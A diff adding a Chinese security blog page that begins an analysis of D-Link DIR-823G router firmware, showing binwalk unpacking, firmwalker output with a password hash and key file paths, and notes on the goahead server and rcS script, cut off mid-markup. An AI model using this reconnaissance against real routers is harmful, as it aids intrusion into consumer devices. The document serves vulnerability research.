@@ -1,0 +1,725 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="dir-823G固件分析信息搜集固件名：DIR823G_V1.0.2B05_20181207.bin  型号：DIR823G 版本：V1.0.2B05_20181207 官网：https:&#x2F;&#x2F;www.DLINK.com&#x2F; 测试环境：Ubuntu 18.04  binwalk -Me 解包  firmwalker枚举 12345678910111213141516171819202122232425">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dir-823G固件分析">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2024/07/07/dir-823G%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="dir-823G固件分析信息搜集固件名：DIR823G_V1.0.2B05_20181207.bin  型号：DIR823G 版本：V1.0.2B05_20181207 官网：https:&#x2F;&#x2F;www.DLINK.com&#x2F; 测试环境：Ubuntu 18.04  binwalk -Me 解包  firmwalker枚举 12345678910111213141516171819202122232425">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803200112593.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803215750320.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803210555510.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803205522223.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803214527009.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240805102525280.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803214834875.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804004942502.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804004909920.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804005342709.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804005447427.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803235729615.png">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240904144238898.png">
+<meta property="article:published_time" content="2024-07-07T02:21:44.000Z">
+<meta property="article:modified_time" content="2024-09-04T06:42:48.586Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803200112593.png">
+  
+  
+  
+  <title>dir-823G固件分析 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="dir-823G固件分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-07 10:21" pubdate>
+          2024年7月7日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">dir-823G固件分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="dir-823G固件分析"><a href="#dir-823G固件分析" class="headerlink" title="dir-823G固件分析"></a>dir-823G固件分析</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>固件名：DIR823G_V1.0.2B05_20181207.bin</p>
+<ul>
+<li>型号：DIR823G</li>
+<li>版本：V1.0.2B05_20181207</li>
+<li>官网：<a target="_blank" rel="noopener" href="https://www.dlink.com/">https://www.DLINK.com/</a></li>
+<li>测试环境：Ubuntu 18.04</li>
+</ul>
+<p>binwalk -Me 解包</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803200112593.png" srcset="/img/loading.gif" lazyload alt="image-20240803200112593"></p>
+<p>firmwalker枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><code class="hljs shell">***Firmware Directory***<br>/home/iot/gujian/_DIR823G_V1.0.2B05_20181207.bin.extracted/squashfs-root/<br>***Search for password files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### passwd</span></span><br>/bin/passwd<br>/etc/passwd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### shadow</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.psk</span></span><br><br>***Search for Unix-MD5 hashes***<br>/home/iot/gujian/_DIR823G_V1.0.2B05_20181207.bin.extracted/squashfs-root/etc/shadow.sample:$1$KEKJV2R0$TFJ4jy7waGKrjdNHwPGzV.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.key</span></span><br>/etc/privateKey.key<br><br>***Search for files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### *.conf</span></span><br>/etc/resolv.conf<br>/etc/boa/boa.conf<br>/etc/host.conf<br>/etc/ushare.conf<br>/etc/wscd.conf<br>/etc/samba/smb.conf<br>/etc/minidlna.conf<br>/etc/lld2d.conf<br>/etc/vsftpd.conf<br><br>***Search for shell scripts***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### shell scripts</span></span><br>/usr/share/udhcpc/eth1.3.sh<br>/usr/share/udhcpc/br0.sh<br>/usr/share/udhcpc/eth1.2.sh<br>/usr/share/udhcpc/usb0.sh<br>/usr/share/udhcpc/wlan0.sh<br>/usr/share/udhcpc/eth1.1.sh<br>/usr/share/udhcpc/eth1.4.sh<br>/usr/share/udhcpc/wlan0-vxd.sh<br>/usr/share/udhcpc/wlan1.sh<br>/usr/share/udhcpc/wlan1-vxd.sh<br>/usr/share/udhcpc/eth1.sh<br>/usr/share/udhcpc/eth0.sh<br>/bin/ddns.sh<br>/bin/disconnect.sh<br>/bin/wlanapp.sh<br>/bin/dhcp6cRcv.sh<br>/bin/l2tp.sh<br>/bin/pppoe_conn_patch.sh<br>/bin/reinit.sh<br>/bin/mp_98c.sh<br>/bin/pppoe.sh<br>/bin/init.sh<br>/bin/connect6.sh<br>/bin/connect.sh<br>/bin/pptp.sh<br>/bin/pppoe_disc_patch.sh<br>/bin/snmpd.sh<br>/bin/killsh.sh<br>/bin/set_rx_gain_from_flash.sh<br>/bin/ip_qos.sh<br>/bin/firewall.sh<br>/bin/mp.sh<br>/bin/startup.sh<br>/web_mtn/cgi-bin/ExportSettings.sh<br>/web_mtn/cgi-bin/GetDownLoadSyslog.sh<br><br>***Search for other .bin files***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### bin files</span></span><br><br>***Search for patterns in files***<br>-------------------- upgrade --------------------<br>/bin/goahead<br>/bin/boa<br>/bin/autoUpgradeFirmware<br>/bin/mtn_upgrade<br>/web/navigation.js<br>/web/menu.htm<br>/web/upload.htm<br><br>-------------------- admin --------------------<br>/bin/goahead<br>/bin/iptables<br>/web_mtn/account.html<br>/web_mtn/Wizard.html<br>/web_mtn/js/Login.js<br>/web_mtn/js/SOAP/SOAPLogin.js<br>/web_mtn/js/checkTimeout.js<br>/web/super_password.htm<br><br>-------------------- root --------------------<br>/bin/goahead<br>/bin/tc<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/timelycheck<br>/bin/boa<br>/bin/speedtest<br>/bin/brctl<br>/bin/miniigd<br>/bin/dnsmasq<br>/bin/isAutoSettings<br>/bin/dnrd<br>/bin/sysconf<br>/bin/flash<br>/bin/wscd<br>/bin/iptables<br>/web_mtn/js/libajax.js<br>/web_mtn/js/json2.js<br>/web_mtn/SharePortSetup.html<br>/etc/boa/boa.conf<br>/etc/passwd_orig<br>/etc/group_orig<br>/etc/tmp/picsdesc.xml<br>/etc/tmp/picsdesc.skl<br>/etc/shadow.sample<br>/etc/minidlna.conf<br>/etc/vsftpd.conf<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br>/lib/libmxml.so.1<br>/lib/libmxml.so<br>/web/wlmultipleap.htm<br>/web/wlsecurity.htm<br>/web/wlwps.htm<br><br>-------------------- password --------------------<br>/bin/goahead<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/timelycheck<br>/bin/boa<br>/bin/fact<br>/bin/ppp_inet<br>/bin/sysconf<br>/bin/orayddns<br>/web_mtn/Network.html<br>/web_mtn/account.html<br>/web_mtn/Guestwireless.html<br>/web_mtn/Wizard.html<br>/web_mtn/Ddns.html<br>/web_mtn/Login.html<br>/web_mtn/js/comm.js<br>/web_mtn/js/libajax.js<br>/web_mtn/js/layer/layer.js<br>/web_mtn/js/SOAP/SOAPDdns.js<br>/web_mtn/js/SOAP/SOAPWizard.js<br>/web_mtn/js/SOAP/SOAPNetwork.js<br>/web_mtn/js/jquery-1.8.2.min.js<br>/web_mtn/js/jquery.js<br>/web_mtn/js/jquery.validate.js<br>/web_mtn/Diagnosis.html<br>/web_mtn/css/style_page.css<br>/web_mtn/SharePortSetup.html<br>/web_mtn/Wireless.html<br>/etc/samba/smb.conf<br>/web/super_password.htm<br>/web/ddns.htm<br>/web/wlwdsenp.htm<br>/web/util_gw.js<br>/web/storage_createuser.htm<br>/web/tcpip_multiwan.htm<br>/web/wizard.htm<br>/web/password.htm<br>/web/util_qos.js<br>/web/openvpn.htm<br>/web/navigation.js<br>/web/tcpipwan.htm<br>/web/wlsurvey.htm<br>/web/menu.htm<br>/web/wlsecurity_all.htm<br><br>-------------------- passwd --------------------<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/timelycheck<br>/bin/getpppoeinfo<br>/bin/sysconf<br>/web_mtn/account.html<br>/web_mtn/Guestwireless.html<br>/web_mtn/Wizard.html<br>/web_mtn/js/AES.js<br>/web_mtn/Wireless.html<br>/etc/samba/smb.conf<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br>/lib/libuClibc-0.9.33.so<br><br>-------------------- pwd --------------------<br>/bin/tc<br>/bin/busybox<br>/bin/curl<br>/bin/wget<br><br>-------------------- dropbear --------------------<br><br>-------------------- ssl --------------------<br>/bin/curl<br>/bin/wget<br>/etc/group_orig<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br><br>-------------------- private key --------------------<br>/bin/curl<br>/etc/privateKey.key<br>/etc/serverkey.pem<br><br>-------------------- telnet --------------------<br>/bin/curl<br>/bin/fact<br>/etc/services<br>/etc/ushare.conf<br>/etc/fact.xml<br><br>-------------------- secret --------------------<br>/bin/pppd<br>/bin/curl<br><br>-------------------- pgp --------------------<br>/bin/goahead<br>/bin/routed<br>/bin/speedtest<br>/bin/speedcheck<br>/etc/mime.types<br><br>-------------------- gpg --------------------<br>/bin/goahead<br>/bin/speedtest<br>/bin/speedcheck<br><br>-------------------- token --------------------<br>/bin/goahead<br>/bin/tc<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/boa<br>/bin/miniigd<br>/web_mtn/js/libajax.js<br>/web/wlsch.htm<br>/web/wlsecurity_all.htm<br><br>-------------------- oauth --------------------<br>/bin/curl<br><br>-------------------- cmd= --------------------<br>/bin/main_lc5761<br>/web_mtn/Wireless.html<br><br>-------------------- command= --------------------<br>/bin/iapp<br><br>-------------------- config --------------------<br>/bin/goahead<br>/bin/busybox<br>/bin/pppd<br>/bin/curl<br>/bin/wget<br>/bin/boa<br>/bin/saveConfigToFile<br>/bin/speedcheck<br>/bin/dnsmasq<br>/bin/udhcpd<br>/bin/flash<br>/bin/wscd<br>/bin/orayddns<br>/web_mtn/js/comm.js<br>/web_mtn/js/jquery.selectbox-0.2_new.js<br>/web_mtn/js/layer/layer.js<br>/web_mtn/js/layer/mobile/layer.js<br>/web_mtn/js/jquery.cookie.js<br>/web_mtn/cgi-bin/ExportSettings.sh<br>/etc/wscd.conf<br>/etc/samba/smb.conf<br>/etc/vsftpd.conf<br>/etc/init.d/rcS_GW<br>/etc/init.d/rcS<br>/lib/libapmib.so<br>/web/wlan_schedule.htm<br>/web/saveconf.htm<br>/web/openvpn.htm<br>/web/tcpip_multiwanlist.htm<br>/web/navigation.js<br>/web/8021q_vlan.htm<br>/web/wlwps.htm<br><br>***Search for web servers***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### search for web servers</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### goahead</span></span><br>/bin/goahead<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### boa</span></span><br>/bin/boa<br>/etc/boa<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### tftp</span></span><br>/bin/tftp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### busybox</span></span><br>/bin/busybox<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### telnetd</span></span><br>/bin/telnetd<br><br>***Search for urls***<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#################################### urls</span></span><br>http://172.16.6.102 页面管理本设备。同时，请确认上行路由器维护 IP 地址不是172.16.6.102，避免 IP 冲突导致网络异常。&lt;<br><br></code></pre></td></tr></table></figure>
+
+<p>重要信息：</p>
+<p>&#x2F;etc&#x2F;init.d&#x2F;rcS</p>
+<p>&#x2F;bin&#x2F;telnetd</p>
+<p>&#x2F;bin&#x2F;goahead</p>
+<p>goahead是mips架构小端</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803215750320.png" srcset="/img/loading.gif" lazyload alt="image-20240803215750320"></p>
+<p>分析启动项rcS</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 